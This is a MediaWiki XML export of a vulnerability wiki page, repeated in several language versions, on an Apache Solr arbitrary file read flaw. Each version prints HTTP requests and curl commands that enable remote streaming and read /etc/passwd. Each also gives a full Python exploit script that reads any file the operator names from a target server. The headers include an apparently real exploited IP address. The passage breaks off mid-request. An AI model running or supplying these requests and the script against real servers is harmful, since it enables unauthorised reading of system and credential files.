Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
&lt;/pre&gt;


&lt;translate&gt;
&lt;!--T:6--&gt;
curl請求爲：
&lt;/translate&gt;
&lt;pre&gt;
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd" 
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
    print('+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&amp;wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在准备文件读取...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能存在漏洞 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] 读取{}失败 \033[0m".format(File_name))
        else:
            print("\033[36m[o] 响应为:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile &gt;&gt;&gt; \033[0m"))
        POC_3(target_url, core_name, File_name)
&lt;/pre&gt;</text>
      <sha1>pf3bm71f2nmb2trwp5m8t03zjeeipv4</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Solr任意文件讀取漏洞/en</title>
    <ns>0</ns>
    <id>1550</id>
    <revision>
      <id>1933</id>
      <timestamp>2021-04-29T03:39:23Z</timestamp>
      <contributor>
        <username>LovelyWei</username>
        <id>118</id>
      </contributor>
      <comment>Created page with "==File Reading=="</comment>
      <origin>1933</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5395" sha1="qic7cnhv0o3zrjhvj9k9lah0az0x1zp" xml:space="preserve">&lt;languages   /&gt;

==Vulnerability Impact==
&lt;pre&gt;
Apache Solr &lt;= 8.8.1
&lt;/pre&gt;

==Exploit==

First, go to the admin page and get the information about core

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json
&lt;/pre&gt;


Send the following packet
&lt;pre&gt;
POST /solr/ckan/config HTTP/1.1
Host: xxx.xxx.xxx:8983
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://118.31.46.134:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
&lt;/pre&gt;

==File Reading==
&lt;pre&gt;
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
&lt;/pre&gt;


curl request as
&lt;pre&gt;
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd" 
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
    print('+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&amp;wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在准备文件读取...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能存在漏洞 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] 读取{}失败 \033[0m".format(File_name))
        else:
            print("\033[36m[o] 响应为:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile &gt;&gt;&gt; \033[0m"))
        POC_3(target_url, core_name, File_name)
&lt;/pre&gt;</text>
      <sha1>qic7cnhv0o3zrjhvj9k9lah0az0x1zp</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Solr任意文件讀取漏洞/fr</title>
    <ns>0</ns>
    <id>693</id>
    <revision>
      <id>927</id>
      <timestamp>2021-04-03T02:43:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Vulnérabilité de lecture arbitraire de fichiers Apache Solr"</comment>
      <origin>927</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5745" sha1="2qxxqs0xordg7trxpanfqx8cxat2i51" xml:space="preserve">&lt;languages   /&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==漏洞影響==
&lt;/div&gt;
&lt;pre&gt;
Apache Solr &lt;= 8.8.1
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==漏洞利用==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
首先進入管理員頁面，獲取core的信息：
&lt;/div&gt;

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json
&lt;/pre&gt;


&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
發送以下數據包
&lt;/div&gt;
&lt;pre&gt;
POST /solr/ckan/config HTTP/1.1
Host: xxx.xxx.xxx:8983
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://118.31.46.134:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==文件讀取==
&lt;/div&gt;
&lt;pre&gt;
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
&lt;/pre&gt;


&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
curl請求爲：
&lt;/div&gt;
&lt;pre&gt;
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd" 
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
    print('+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&amp;wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在准备文件读取...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能存在漏洞 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] 读取{}失败 \033[0m".format(File_name))
        else:
            print("\033[36m[o] 响应为:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile &gt;&gt;&gt; \033[0m"))
        POC_3(target_url, core_name, File_name)
&lt;/pre&gt;</text>
      <sha1>2qxxqs0xordg7trxpanfqx8cxat2i51</sha1>
    </revision>
    <revision>
      <id>934</id>
      <parentid>927</parentid>
      <timestamp>2021-04-03T02:44:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "La requête curl est:"</comment>
      <origin>934</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5446" sha1="jp5hxrnf74yc0jonadocfl5keslgvyy" xml:space="preserve">&lt;languages   /&gt;

== Impact de la vulnérabilité ==
&lt;pre&gt;
Apache Solr &lt;= 8.8.1
&lt;/pre&gt;

== Exploiter ==

Accédez d'abord à la page administrateur pour obtenir les informations principales:

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json
&lt;/pre&gt;


Envoyez le paquet suivant
&lt;pre&gt;
POST /solr/ckan/config HTTP/1.1
Host: xxx.xxx.xxx:8983
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://118.31.46.134:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
&lt;/pre&gt;

== Lecture de fichier ==
&lt;pre&gt;
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
&lt;/pre&gt;


La requête curl est:
&lt;pre&gt;
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd" 
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
    print('+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&amp;wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在准备文件读取...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能存在漏洞 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] 读取{}失败 \033[0m".format(File_name))
        else:
            print("\033[36m[o] 响应为:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile &gt;&gt;&gt; \033[0m"))
        POC_3(target_url, core_name, File_name)
&lt;/pre&gt;</text>
      <sha1>jp5hxrnf74yc0jonadocfl5keslgvyy</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Solr任意文件讀取漏洞/uk</title>
    <ns>0</ns>
    <id>302</id>
    <revision>
      <id>457</id>
      <timestamp>2021-03-19T11:02:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "запит curl:"</comment>
      <origin>457</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5542" sha1="hktpsuz4ds39moo91nx0hxosumuc2dy" xml:space="preserve">&lt;languages   /&gt;

== Вплив вразливості ==
&lt;pre&gt;
Apache Solr &lt;= 8.8.1
&lt;/pre&gt;

== Експлуатувати ==

Спочатку зайдіть на сторінку адміністратора, щоб отримати інформацію core:

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json
&lt;/pre&gt;


Відправте наступний пакет
&lt;pre&gt;
POST /solr/ckan/config HTTP/1.1
Host: xxx.xxx.xxx:8983
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://118.31.46.134:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
&lt;/pre&gt;

== Читання файлу ==
&lt;pre&gt;
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
&lt;/pre&gt;


запит curl:
&lt;pre&gt;
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd" 
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
    print('+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&amp;wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在准备文件读取...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能存在漏洞 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] 读取{}失败 \033[0m".format(File_name))
        else:
            print("\033[36m[o] 响应为:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile &gt;&gt;&gt; \033[0m"))
        POC_3(target_url, core_name, File_name)
&lt;/pre&gt;</text>
      <sha1>hktpsuz4ds39moo91nx0hxosumuc2dy</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Solr任意文件讀取漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3543</id>
    <revision>
      <id>4118</id>
      <timestamp>2021-06-06T08:59:11Z</timestamp>
      <contributor>
        <username>Xl199928</username>
        <id>290</id>
      </contributor>
      <comment>Created page with "==漏洞利用=="</comment>
      <origin>4118</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5379" sha1="64aoqxw38drg03iw0r8f3ulmnof7yf2" xml:space="preserve">&lt;languages   /&gt;

==漏洞影响==
&lt;pre&gt;
Apache Solr &lt;= 8.8.1
&lt;/pre&gt;

==漏洞利用==

首先进入管理员页面，获取core的信息：

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json
&lt;/pre&gt;


发送以下数据包
&lt;pre&gt;
POST /solr/ckan/config HTTP/1.1
Host: xxx.xxx.xxx:8983
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://118.31.46.134:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
&lt;/pre&gt;

==文件读取==
&lt;pre&gt;
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
